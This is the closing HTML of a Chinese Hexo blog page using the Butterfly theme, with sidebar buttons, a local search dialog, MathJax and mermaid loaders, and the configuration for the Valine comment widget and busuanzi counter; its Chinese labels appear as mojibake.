id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>ç”±</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>æä¾›æ”¯æŒ</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  var script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    $.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js', function () {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'default',
      })
      false && mermaid.init()
    })
  }
}</script><script>function loadValine () {
  function initValine () {
    const initData = {
      el: '#vcomment',
      appId: '7zujCcS8pYH88CJXfdBlLyS8-gzGzoHsz',
      appKey: 'lWGr7OPoNHo4v1YmVV5yr3E9',
      placeholder: 'æ¥å‹¾æ­æˆ‘å‘€ğŸ¥°',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '//i0.hdslb.com/bfs/emote/',
      emojiMaps: {"tv_doge":"6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png","tv_äº²äº²":"a8111ad55953ef5e3be3327ef94eb4a39d535d06.png","tv_å·ç¬‘":"bb690d4107620f1c15cff29509db529a73aee261.png","tv_å†è§":"180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png","tv_å†·æ¼ ":"b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png","tv_å‘æ€’":"34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png","tv_å‘è´¢":"34db290afd2963723c6eb3c4560667db7253a21a.png","tv_å¯çˆ±":"9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png","tv_åè¡€":"09dd16a7aa59b77baa1155d47484409624470c77.png","tv_å‘†":"fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png","tv_å‘•å":"9f996894a39e282ccf5e66856af49483f81870f3.png","tv_å›°":"241ee304e44c0af029adceb294399391e4737ef2.png","tv_åç¬‘":"1f0b87f731a671079842116e0991c91c2c88645a.png","tv_å¤§ä½¬":"093c1e2c490161aca397afc45573c877cdead616.png","tv_å¤§å“­":"23269aeb35f99daee28dda129676f6e9ea87934f.png","tv_å§”å±ˆ":"d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png","tv_å®³ç¾":"a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png","tv_å°´å°¬":"7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png","tv_å¾®ç¬‘":"70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png","tv_æ€è€ƒ":"90cf159733e558137ed20aa04d09964436f618a1.png","tv_æƒŠå“":"0d15c7e2ee58e935adc6a7193ee042388adc22af.png"},
      enableQQ: true,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick'.split(','))
    }

    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
  else setTimeout(() => loadValine(), 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>